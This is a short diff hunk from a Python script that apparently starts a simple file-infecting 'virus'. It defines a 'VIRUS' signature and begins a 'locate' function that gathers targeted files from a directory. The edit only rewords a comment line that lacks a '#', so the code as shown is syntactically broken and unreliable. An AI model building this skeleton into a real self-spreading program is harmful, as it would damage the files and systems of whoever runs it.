@@ -6,7 +6,7 @@ import datetime
 # Define a variable named SIGNATURE and set it to VIRUS
 SIGNATURE = "VIRUS"
 
-Define a function
+Define a function called locate which 
 def locate(path):
     files_targeted = []
     filelist = os.listdir(path)
